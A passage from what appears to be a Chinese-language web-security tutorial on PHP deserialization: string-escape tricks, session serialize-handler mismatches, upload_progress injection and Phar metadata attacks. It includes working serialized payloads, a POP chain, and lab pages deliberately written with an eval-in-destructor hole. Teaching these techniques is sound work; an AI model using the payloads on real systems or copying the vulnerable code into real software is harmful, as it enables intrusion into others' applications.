class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;aaaabb&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果如下：</span></span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;aaaaccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>在上面的结果中看到 name 的值变成了 <code>aaaaccc</code>，是7个字符，但是字符的长度却还是6，而在反序列化后我们系统只能看到 <code>aaaacc</code> 这六个，也就是说有一个 <code>c</code> 逃出来了，那么我们输入几个 <code>bb</code> 不就能逃逸几个字符了吗，逃逸的字符就是我们要构造的 payload 。</p><p>接下来的任务就是修改 <code>pass</code> 的值，payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; // 27个字符</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;aaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果如下：</span></span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;aaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>上面说过了 <code>&quot;;&#125;</code> 是结束的标志，所以当系统识别到结束符号，就不再执行后面的字符串了，也就是说 <code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code> 就被丢弃了，从而完成了 <code>pass</code> 值的修改。</p><h3 id="2、收缩"><a href="#2、收缩" class="headerlink" title="2、收缩"></a>2、收缩</h3><p>上面讲到了扩张的字符串逃逸，那么收缩的字符串比扩张的要简单很多，这里继续沿用扩张的例子讲解，修改了一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到修改 name 的值为 aaaabb 后，序列化出来的 name 的长度变为了 6 ，但是值的长度却只有 4 个，那么消失的字符串是不是就可以构造 payload 了呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;aaaabb&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>这里我们要构造的 payload 是 <code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，也就是 27 个字符长度，那么就需要 9 个 <code>bbb</code> ，传入 payload 就成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数执行前：</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">函数执行后：</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:54:&quot;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>发现了 name 的值有 54 个，27 个 <code>bbb</code> 被替换为空，另外 27 个是我们传入的 payload ，那么这就导致了一个问题——报错，name 的值无法满足，那么该怎么构造？还有一个参数——pass，可以利用它来帮助我们构造 payload.</p><p>那么我们利用了 pass 参数来构造，我们不用在 name 后面加 payload 了，但是还是有个问题，就是 name 的值是 27 个 <code>bbb</code>，那么函数执行后就会替换为空，那么空出来的 27 个放什么呢？又给谁去构造呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">pass=<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:1:&quot;</span>A<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:27:&quot;</span><span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:27:&quot;</span><span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>答案依然是 pass ， pass 来帮我们来构造 27 个字符给 name。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">pass=abcdefgh<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">结果如下：</span></span><br><span class="line"><span class="string">O:1:&quot;</span>A<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:27:&quot;</span><span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:27:&quot;</span>abcdefgh<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span>hacker<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;;s:4:&quot;pass&quot;;s:27:&quot;abcdefgh 这一串就是 name 的值</span></span><br><span class="line"><span class="comment">// s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125; 传入的 payload 就会被执行</span></span><br><span class="line"><span class="comment">// 后面的 &quot;;&#125; 被忽略不被执行</span></span><br></pre></td></tr></table></figure><br><h2 id="四、Session反序列化"><a href="#四、Session反序列化" class="headerlink" title="四、Session反序列化"></a>四、Session反序列化</h2><p><strong>我们先来了解一下什么是 Session ？</strong></p><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session  对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web  服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p><p><strong>session是如何起作用的</strong><br>当第一次访问网站时，Seesion_start() 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端Cookie 中。同时，也在服务器端创建一个以Session  ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的Seesion  ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个 Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p><p><strong>除此之外，还需要知道session_start()这个函数以及这个函数所起的作用：</strong><br>当会话自动开始或者通过 session_start() 手动开始的时候， PHP  内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP  会自动反序列化session文件的内容，并将之填充到 $_SESSION  超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的)的文件。如果客户端未发送 PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p><p><strong>php.ini 的一些关于 session 的配置选项：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot; --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot;--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动</span><br><span class="line">session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure><p><strong>Linux 上 php-session 常见的一些存放位置：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure><p><strong>Session 的处理引擎（造成反序列化漏洞的关键）：</strong></p><p>其实PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。就是说在实际情况中，我们的 PHP 默认的存储引擎是 php_serialize 的，但是我们的程序员糊涂，写了一个 php 文件，设置的引擎是 php 的，这导致了两边不一致 ，就会产生漏洞。</p><p>如：使用不同引擎来处理session文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面是三个 session 的存储情况：</span></span><br><span class="line">php_binary：ASCII+键名+serialize后的值</span><br><span class="line">    <span class="comment">// lemons:3:&quot;shy&quot;;</span></span><br><span class="line"></span><br><span class="line">php：键名+|+serialize后的值</span><br><span class="line">    <span class="comment">// lemon|s:3:&quot;shy&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">php_serialize</span>(php&gt;<span class="number">5.5</span>.<span class="number">4</span>)：serialize后的值</span><br><span class="line">    <span class="comment">// a:1:&#123;s:5:&quot;lemon&quot;;s:3:&quot;shy&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1、使用不同引擎来处理session文件"><a href="#1、使用不同引擎来处理session文件" class="headerlink" title="1、使用不同引擎来处理session文件"></a>1、使用不同引擎来处理session文件</h3><p>攻击思路：首先访问 1.php ，在传入的参数最开始加一个 |，由于 1.php 是使用 php_serialize 引擎处理，因此只会把 | 当做一个正常的字符。然后访问 2.php ，由于用的是 php 引擎，因此遇到 | 时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析 session 文件时直接对 | 后的值进行反序列化处理。内容如下：</p><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;lemon&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地构造 pop 链（修改 name 的值）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name =  <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;age = <span class="string">&quot;100&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// O:7:&quot;student&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;hacker&quot;;s:3:&quot;age&quot;;s:3:&quot;100&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>访问 1.php，传入参数 a，根据 php 引擎的存储格式，payload 如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=|O:<span class="number">7</span>:<span class="string">&quot;student&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png" alt="PHP反序列化-1"></p><p>访问 2.php，执行成功</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png" alt="PHP反序列化-2"></p><h3 id="2、没有-SESSION-变量赋值"><a href="#2、没有-SESSION-变量赋值" class="headerlink" title="2、没有 $_SESSION 变量赋值"></a>2、没有 $_SESSION 变量赋值</h3><p>在 PHP 中还存在一个 upload_process 机制，即自动在 $_SESSION 中创建一个键值对，值中刚好存在用户可控的部分。</p><p>这种攻击方法与上一部分基本相同，不过得需要<strong>先上传文件，同时 POST 一个与 session.upload_process.name 的同名变量。后端会自动将 POST 的这个同名变量作为键进行序列化然后存储到 session 文件中。下次请求就会反序列化 session 文件，从中取出这个键。</strong>所以攻击点还是跟上一部分一模一样，程序还是使用了不同的 session 处理引擎.</p><p>攻击思路：创建一个表单 post 上传，然后再创建一个 1.php 文件作为漏洞利用网页，因为 1.php 上 $_SESSION 这个超级全局变量不可控，所以我们要之间构造，也就是表单上传。其中要利用到的机制是 upload_progress，因为在上传的时候我们要修改文件名为 payload，这是因为 upload_progress 机制会把我们上传的文件名存储到 session 里，下次拿出来用的时候就会调用 session 里面的 payload，然后执行。具体的 upload_progress 机制可以参考官网给出的解释。像条件竞争也用到这个机制。</p><p><strong>upload_progress 几个重要的参数：</strong></p><p>然后需要注意的是在做 session 反序列化漏洞测试或者是复现的时候，session.upload_progress.cleanup 这个选项要为 Off 才能上传文件，否则无法上传。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = off</span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.2.130/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pop 链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctf;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:1:&#123;s:1:&quot;a&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>payload 需要在前面加一个 |，因为前面讲过了，php 默认是 php_serialize ，而页面用的是 php，所以 php 的读取会将 | 也那拿去执行了，然后就是要转义，在双引号前加 \。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">3</span>:\<span class="string">&quot;ctf\&quot;:1:&#123;s:1:\&quot;a\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png" alt="PHP反序列化-3"></p><br><h2 id="五、Phar-反序列化"><a href="#五、Phar-反序列化" class="headerlink" title="五、Phar 反序列化"></a>五、Phar 反序列化</h2><p><strong>什么是 Phar？</strong></p><p>PHAR (“Php ARchive”) 是 PHP 里类似于 JAR 的一种打包文件，在 PHP 5.3 或更高版本中默认开启，这个特性使得 PHP 也可以像  Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p><p>利用这种方法可以在不使用 unserialize() 函数的情况下触发 PHP 反序列化漏洞。漏洞触发是利用 Phar:&#x2F;&#x2F; 伪协议读取 phar 文件时，会反序列化 meta-data 储存的信息。</p><p><strong>Phar 文件结构</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、stub</span><br><span class="line">stub的基本结构：xxx&lt;?php xxx;__HALT_COMPILER();?&gt;，前面内容不限，但必须以 __HALT_COMPILER();?&gt; 来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</span><br><span class="line"></span><br><span class="line">2、Meta-data</span><br><span class="line">Phar 文件中被压缩的文件的一些信息，其中 Meta-data 部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</span><br><span class="line"></span><br><span class="line">3、文件内容</span><br><span class="line">被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</span><br><span class="line"></span><br><span class="line">4、签名格式</span><br></pre></td></tr></table></figure><p><strong>前提：php.ini 中的 phar.readonly 选项设置为 Off，否则无法生成 phar 文件</strong></p><p>下面是一个 phar 文件的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来在本地搭建测试一下 phar 反序列化</p><p>攻击思路：在服务器创建三个文件，一个 upload_file.php 负责文件上传，一个 upload.html 表单负责提交文件给 upload_file.php，一个 index.php，负责给出所需要反序列化的类。在本地构造 pop 链生成 phar 文件，然后上传，在 index.php 伪协议访问即可。</p><p>upload_file.php</p><p>普通的一个上传文件，没有任何检测，当然在实际情况可能还会设检测，绕 waf 什么的，这里只关注 phar 反序列化即可，对于文件上传不做赘述。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 